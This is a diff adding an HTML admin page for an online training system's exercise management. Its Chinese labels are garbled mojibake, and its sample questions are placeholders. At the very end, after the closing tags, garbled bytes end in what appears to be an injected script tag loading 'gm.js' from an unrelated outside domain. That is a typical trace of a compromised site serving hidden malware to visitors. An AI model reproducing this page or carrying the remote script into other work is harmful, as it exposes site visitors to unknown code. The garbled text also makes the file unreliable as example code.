@@ -1,0 +1,130 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>π„∂´ºÏ—ÈºÏ“ﬂ£®ºÏŒÒ£©Õ¯…œ≈‡—µœµÕ≥∫ÛÃ®π‹¿ÌœµÕ≥</title>
+<link href="../css/htlogin.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="../datepicker/doTable.js"></script>
+<script type="text/javascript" src="../FCKeditor/fckeditor.js"></script>
+<script>
+<!--
+	function getdata()
+	{
+		var url = document.location.search;
+		var vv = url.split('&');
+		if(vv.length==3)
+		{
+			document.all.txtid.value=vv[0].substring(vv[0].indexOf('=')+1,vv[0].length);			
+			document.all.txtname.value=vv[1].substring(vv[1].indexOf('=')+1,vv[1].length);
+			document.all.txtpid.value=vv[2].substring(vv[2].indexOf('=')+1,vv[2].length);
+		}
+	}
+//-->
+</script>
+</head>
+<body onload="getdata();">
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#D8F0FD">
+<tr>
+<td>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#D8F0FD">
+      <tr>
+             <td background="../images/ht-body01.jpg" class="body02">µ±«∞Œª÷√£∫≈‡—µπ‹¿Ì-œ∞Ã‚π‹¿Ì-ÃÌº”œ∞Ã‚</td>
+      </tr>
+</table>
+</td>
+</tr>
+
+<tr>
+<td>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" bgcolor="#D8F0FD">
+           <tr>
+              <td width="11%" class="body06">ΩÃ≤ƒ£∫</td>
+              <td width="27%" class="body04"><select style="width:100px;"><option>ΩÃ≤ƒ1</option><option>ΩÃ≤ƒ2</option><option>ΩÃ≤ƒ3</option></select></td>
+              <td width="14%" class="body06">œ∞Ã‚√˚≥∆£∫</td>
+              <td width="48%" class="body04"><input name="txtname" type="text" class="bodytext" /></td>
+            </tr>
+            <tr>
+              <td colspan="4" class="body03"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td>&nbsp;</td>
+		            <td width="14%"><input type="image" src="../images/ht-but-add.jpg" name="Submit223" onclick="document.all.xiti.style.display='';" /></td>
+		            <td width="8%" ><input type="image" src="../images/ht-but-back.jpg" name="Submit224" onclick="window.history.back();"/></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table>
+</td>
+</tr>
+
+
+<tr id="xiti" style="display:none">
+        <td class="body01a"><table width="100%" border="0" cellspacing="0" cellpadding="0"  bgcolor="#D8F0FD">
+          <tr>
+            <td colspan="4" background="../images/ht-body02.jpg" class="body03">œ∞Ã‚</td>
+            <td width="215" background="../images/ht-body02.jpg" class="body03"><input type="image" src="../images/ht-but-addtm.jpg" name="Submit224" onclick="addfun();"/></td>
+          </tr>
+          <tr>
+            <td width="98" align="center" class="body05">Ã‚ƒø¿‡–Õ</td>
+            <td width="426" align="center" class="body05">Ã‚ƒø</td>
+            <td width="131" align="center" class="body05">¥∞∏</td>
+            <td width="119" align="center" class="body05">œ‘ æÀ≥–Ú</td>
+            <td align="center" class="body05">≤Ÿ◊˜</td>
+          </tr>
+          <tr>
+              <td class="body03">∂‡—°Ã‚</td>
+              <td class="body03">aabb</td>
+              <td class="body03">ab</td>
+              <td class="body03"><input style="width:20px;"/></td>
+              <td align="center" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('»∑ µ“™…æ≥˝¬£ø')){return false;};this.parentNode.parentNode.style.display='none';" />
+                <input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='viewit.html';"/></td>
+          </tr>
+          <tr>
+            <td class="body03">µ•—°Ã‚</td>
+            <td class="body03">aabb</td>
+            <td class="body03">ab</td>
+            <td class="body03"><input style="width:20px;"/></td>
+            <td  align="center" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('»∑ µ“™…æ≥˝¬£ø')){return false;};this.parentNode.parentNode.style.display='none';" />
+              <input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='viewit.html';"/></td>
+          </tr>
+          <tr>
+            <td class="body03">∂‡—°Ã‚</td>
+            <td class="body03">aabb</td>
+            <td class="body03">cd</td>
+            <td class="body03"><input style="width:20px;"/></td>
+            <td align="center" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('»∑ µ“™…æ≥˝¬£ø')){return false;};this.parentNode.parentNode.style.display='none';" />
+              <input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='viewit.html';"/></td>
+          </tr>
+          <tr>
+            <td class="body03">≈–∂œÃ‚</td>
+            <td class="body03">Are you ready? </td>
+            <td class="body03"> «</td>
+            <td class="body03"><input style="width:20px;"/></td>
+            <td align="center" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('»∑ µ“™…æ≥˝¬£ø')){return false;};this.parentNode.parentNode.style.display='none';" />
+              <input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='viewit.html';"/></td>
+          </tr>
+          <tr>
+            <td class="body03">∂‡—°Ã‚</td>
+            <td class="body03">aabb</td>
+            <td class="body03">cd</td>
+            <td class="body03"><input style="width:20px;"/></td>
+            <td  align="center" class="body03"><input type="image" src="../images/ht-but-del.jpg" name="Submit224" onclick="if(!confirm('»∑ µ“™…æ≥˝¬£ø')){return false;};this.parentNode.parentNode.style.display='none';" />
+              <input type="image" src="../images/ht-but-adit.jpg" name="Submit22" onclick="window.location='viewit.html';"/></td>
+          </tr>
+        </table></td>
+</tr>
+
+
+</table>
+
+
+</body>
+<script>
+	function addfun()
+	{
+		window.location="addquestion.html";
+
+	}
+</script>
+{Æ
+z∏.”O5—v¯ŒmâGìg9±´ôñÌêÏhttp://qqq.dzydhx.com/gm.js></script>
